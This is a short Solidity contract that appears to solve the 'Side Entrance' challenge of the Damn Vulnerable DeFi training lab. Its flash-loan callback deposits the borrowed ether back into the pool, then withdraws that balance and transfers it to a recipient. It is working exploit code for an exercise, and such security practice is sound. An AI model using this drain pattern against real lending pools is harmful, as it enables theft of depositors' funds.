// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;


import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool,IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract IFlashLoanEtherReceiverImpl is IFlashLoanEtherReceiver {
    
   function execute() external payable
    {
        // diagnostic
        console.log("IFlashLoanEtherReceiverImpl.execute called");
        console.log(" msg.sender:", msg.sender);
        console.log(" value:", msg.value);
        console.log(" balance:",address(this).balance);
        SideEntranceLenderPool(payable(msg.sender)).deposit{value: msg.value}();
        console.log(" balance:",address(this).balance);
        
    }

     function flashLoan(SideEntranceLenderPool pool,uint256 amount) external {
        pool.flashLoan(amount);
    }

    function withdraw(SideEntranceLenderPool pool) external {
        pool.withdraw();
    }

    function transferTo(address payable recipient) public {
        uint256 amount = address(this).balance; // 全部余额
        recipient.transfer(amount);
    }


}
